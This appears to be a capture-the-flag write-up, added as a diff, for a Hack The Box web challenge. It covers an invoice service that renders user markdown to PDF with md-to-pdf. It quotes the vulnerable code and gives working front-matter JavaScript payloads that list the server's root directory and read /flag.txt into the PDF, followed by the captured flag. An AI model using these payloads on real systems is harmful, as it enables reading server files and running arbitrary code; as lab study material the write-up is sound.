@@ -1,0 +1,41 @@
+access: http://144.126.206.249:31477/
+take look code: MDHelper.js
+const makePDF = async (markdown) => {
+    return new Promise(async (resolve, reject) => {
+        id = uuidv4();
+        try {
+            await mdToPdf(
+                { content: markdown },
+                {
+                    dest: `static/invoices/${id}.pdf`,
+                    launch_options: { args: ['--no-sandbox', '--js-flags=--noexpose_wasm,--jitless'] } 
+                }
+            );
+            resolve(id);
+        } catch (e) {
+            reject(e);
+        }
+    });
+}
+
+some md-to-pdf vulnerability:
+https://github.com/simonhaenisch/md-to-pdf/issues/99
+
+payload:
+---js
+{
+    css: `body::before { content: "${require('fs').readdirSync('/').join()}"; display: block }`,
+}
+---
+
+let's put this code on new invoice:
+---js
+{
+    css: `body::before { content: "${require('fs').readFileSync('/flag.txt')}"; display: block }`,
+}
+---
+see pdf:
+HTB{int3rG4l4c7iC_r1d3_0n_bl1nk3r_flu1d5}
+
+resource:
+https://heinandre.no/htb-cyber-apocalypse-2022/web/blinker-fluids/
